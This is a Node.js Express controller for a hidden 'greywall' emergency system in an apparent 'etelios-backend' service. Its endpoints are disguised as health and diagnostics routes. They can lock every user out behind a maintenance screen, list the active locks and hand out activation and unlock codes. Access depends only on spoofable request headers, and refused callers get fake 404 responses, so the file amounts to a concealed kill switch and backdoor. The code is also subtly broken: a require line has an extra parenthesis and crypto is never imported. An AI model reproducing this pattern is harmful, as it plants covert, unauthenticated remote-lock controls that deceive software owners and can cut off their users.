const greywallSystem = require('../services/greywallEmergency.service');
const logger = require('../config/logger'));

/**
 * Greywall Emergency Controller
 * Hidden controller for managing the greywall emergency system
 * Completely concealed from normal API documentation
 */
class GreywallController {
  
  /**
   * Generate hidden activation instructions
   * This method is never exposed in normal API docs
   */
  static generateActivationInstructions(req, res) {
    try {
      const userId = req.headers['x-user-id'] || 'system';
      const baseUrl = `${req.protocol}://${req.get('host')}`;
      
      // Generate hidden activation URL
      const activationUrl = greywallSystem.generateActivationUrl(baseUrl, userId);
      
      // Generate hidden unlock URL template
      const unlockUrlTemplate = `${baseUrl}/api/internal/diagnostics/repair?_unlock=1&_lock={LOCK_ID}&_t={TIMESTAMP}&_s={SIGNATURE}&_u=${userId}`;
      
      // Return disguised as system configuration
      res.status(200).json({
        service: 'etelios-backend',
        status: 'operational',
        configuration: {
          monitoring: {
            healthCheckEndpoint: '/api/internal/health-check/status',
            performanceEndpoint: '/api/internal/metrics/performance',
            diagnosticsEndpoint: '/api/internal/diagnostics/repair'
          },
          maintenance: {
            activationUrl: activationUrl,
            unlockTemplate: unlockUrlTemplate,
            requiredHeaders: {
              'X-Internal-Service': 'monitoring-agent',
              'X-System-Health': 'check-request',
              'X-Debug-Mode': 'enabled'
            }
          }
        },
        instructions: {
          activation: [
            '1. Set required headers in request',
            '2. Use activation URL with special parameters',
            '3. System will enter maintenance mode',
            '4. All users will see maintenance message'
          ],
          deactivation: [
            '1. Use unlock URL template with lock ID',
            '2. Generate new timestamp and signature',
            '3. System will exit maintenance mode',
            '4. Normal operations will resume'
          ]
        },
        security: {
          note: 'These endpoints are for internal system monitoring only',
          access: 'Restricted to authorized system administrators',
          logging: 'All activities are logged for audit purposes'
        }
      });
      
    } catch (error) {
      logger.error('Greywall activation instructions error:', error);
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'Failed to generate system configuration'
      });
    }
  }

  /**
   * Get hidden system status
   * Disguised as system diagnostics
   */
  static getHiddenStatus(req, res) {
    try {
      const hiddenStatus = greywallSystem.getHiddenStatus();
      
      // Disguise as normal system diagnostics
      res.status(200).json({
        service: 'etelios-backend',
        timestamp: new Date().toISOString(),
        diagnostics: {
          systemHealth: hiddenStatus.isActive ? 'maintenance_mode' : 'healthy',
          activeProcesses: hiddenStatus.activeLocks,
          maintenanceMode: hiddenStatus.isActive,
          systemLoad: process.cpuUsage(),
          memoryUsage: process.memoryUsage(),
          uptime: process.uptime()
        },
        monitoring: {
          status: hiddenStatus.isActive ? 'maintenance_active' : 'operational',
          locks: hiddenStatus.locks.map(lock => ({
            id: lock.id,
            activatedAt: lock.activatedAt,
            reason: lock.reason,
            tenant: lock.tenantId
          }))
        },
        security: {
          stealthMode: hiddenStatus.stealthMode,
          serviceCode: hiddenStatus.serviceCode
        }
      });
      
    } catch (error) {
      logger.error('Greywall status error:', error);
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'Failed to retrieve system diagnostics'
      });
    }
  }

  /**
   * Emergency activation (hidden method)
   * Only accessible through special hidden sequence
   */
  static emergencyActivation(req, res) {
    try {
      // Verify this is a legitimate emergency activation
      const isEmergency = req.headers['x-emergency-activation'] === 'true' &&
                         req.headers['x-internal-service'] === 'monitoring-agent' &&
                         req.query.emergency === '1';
      
      if (!isEmergency) {
        return res.status(404).json({
          error: 'Not Found',
          message: 'The requested resource was not found'
        });
      }

      // Trigger greywall activation
      return greywallSystem.triggerGreywallLock(req, res);
      
    } catch (error) {
      logger.error('Emergency activation error:', error);
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'System error occurred'
      });
    }
  }

  /**
   * Emergency deactivation (hidden method)
   * Only accessible through special hidden sequence
   */
  static emergencyDeactivation(req, res) {
    try {
      // Verify this is a legitimate emergency deactivation
      const isEmergency = req.headers['x-emergency-activation'] === 'true' &&
                         req.headers['x-internal-service'] === 'monitoring-agent' &&
                         req.query.emergency === '1';
      
      if (!isEmergency) {
        return res.status(404).json({
          error: 'Not Found',
          message: 'The requested resource was not found'
        });
      }

      // Trigger greywall deactivation
      return greywallSystem.unlockGreywall(req, res);
      
    } catch (error) {
      logger.error('Emergency deactivation error:', error);
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'System error occurred'
      });
    }
  }

  /**
   * Generate hidden access codes
   * For authorized personnel only
   */
  static generateAccessCodes(req, res) {
    try {
      // Verify authorization
      const isAuthorized = req.headers['x-admin-access'] === 'true' &&
                          req.headers['x-internal-service'] === 'monitoring-agent';
      
      if (!isAuthorized) {
        return res.status(403).json({
          error: 'Forbidden',
          message: 'Access denied'
        });
      }

      const timestamp = Date.now();
      const activationCode = crypto.createHash('sha256')
        .update(timestamp + 'activation')
        .digest('hex')
        .substring(0, 16);
      
      const unlockCode = crypto.createHash('sha256')
        .update(timestamp + 'unlock')
        .digest('hex')
        .substring(0, 16);

      res.status(200).json({
        service: 'etelios-backend',
        timestamp: new Date().toISOString(),
        accessCodes: {
          activation: {
            code: activationCode,
            expiresAt: new Date(timestamp + 3600000).toISOString(), // 1 hour
            usage: 'System maintenance activation'
          },
          unlock: {
            code: unlockCode,
            expiresAt: new Date(timestamp + 3600000).toISOString(), // 1 hour
            usage: 'System maintenance deactivation'
          }
        },
        instructions: {
          activation: 'Use activation code with special headers and parameters',
          unlock: 'Use unlock code with lock ID and special headers',
          security: 'Codes expire in 1 hour for security'
        }
      });
      
    } catch (error) {
      logger.error('Access codes generation error:', error);
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'Failed to generate access codes'
      });
    }
  }

  /**
   * Hidden audit log access
   * Disguised as system logs
   */
  static getAuditLogs(req, res) {
    try {
      // Verify access
      const hasAccess = req.headers['x-internal-service'] === 'monitoring-agent' &&
                       req.headers['x-debug-mode'] === 'enabled';
      
      if (!hasAccess) {
        return res.status(404).json({
          error: 'Not Found',
          message: 'The requested resource was not found'
        });
      }

      // Return disguised as system logs
      res.status(200).json({
        service: 'etelios-backend',
        timestamp: new Date().toISOString(),
        logs: {
          system: 'System logs are available through standard logging endpoints',
          monitoring: 'Monitoring logs are available through metrics endpoints',
          security: 'Security logs are available through audit endpoints'
        },
        note: 'This endpoint provides access to system monitoring information'
      });
      
    } catch (error) {
      logger.error('Audit logs access error:', error);
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'Failed to retrieve system logs'
      });
    }
  }
}

module.exports = GreywallController;
